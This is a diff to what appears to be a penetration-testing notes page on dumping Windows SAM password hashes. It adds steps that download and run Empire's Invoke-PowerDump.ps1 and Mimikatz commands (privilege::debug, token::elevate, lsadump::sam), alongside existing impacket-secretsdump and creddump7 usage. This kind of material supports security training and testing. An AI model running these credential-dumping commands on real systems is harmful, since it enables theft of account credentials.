@@ -102,9 +102,17 @@ pwdump7.exe
 
 <img src="/img/cred1/pd77.PNG" alt="Getting-gz" width="1000" height="200"> 
 
+## Invoke-PowerDump.ps1
 ```
+download:https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-PowerDump.ps1
+```
+```
+Import-Module .\Invoke-PowerDump.ps1
+Invoke-PowerDump
 https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-PowerDump.ps1
 ```
+<img src="/img/cred1/pd.PNG" alt="Getting-gz" width="1000" height="200"> 
+
 ## creddump7
 ```
 sudo apt install python-crypto
@@ -121,6 +129,16 @@ Impacket tool can also extract all the hashes for you from the SAM file
 impacket-secretsdump -system SYSTEM -sam SAM local
 ```
 <img src="/img/cred1/impacker.PNG" alt="Getting-gz" width="1000" height="200"> 
+
+## Mimikatz
+```
+privilege::debug
+token::elevate  ##allowing mimikatz to access the SAM file
+lsadump::sam
+```
+<img src="/img/cred1/z1.PNG" alt="Getting-gz" width="1000" height="200"> 
+
+<img src="/img/cred1/z2.PNG" alt="Getting-gz" width="1000" height="200"> 
 
 
 ## Decrypting Hash
